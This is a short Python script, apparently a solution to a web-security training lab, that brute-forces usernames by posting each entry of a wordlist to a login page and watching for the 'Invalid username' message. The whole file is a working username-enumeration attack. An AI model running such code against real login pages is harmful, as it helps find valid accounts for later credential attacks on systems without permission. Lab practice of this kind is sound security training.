import requests
from bs4 import BeautifulSoup

site = '0a9600ef033042ec8a126d1900e10039.web-security-academy.net'
login_url = f'https://{site}/login'
s = requests.Session()

with open("auth-lab-usernames.txt", "r") as f:
    lines = f.readlines()

for user in lines:
    target = user.strip()
    logindata = {
        'username': target,
        'password': 'foo'
    }
    resp = s.post(login_url, data=logindata)
    
    # DEBUGGING OUTPUT
    print(f'Trying username: {target}')
    
    if 'Invalid username' not in resp.text:
        print(f'[+] Valid username found: {target}')
        break
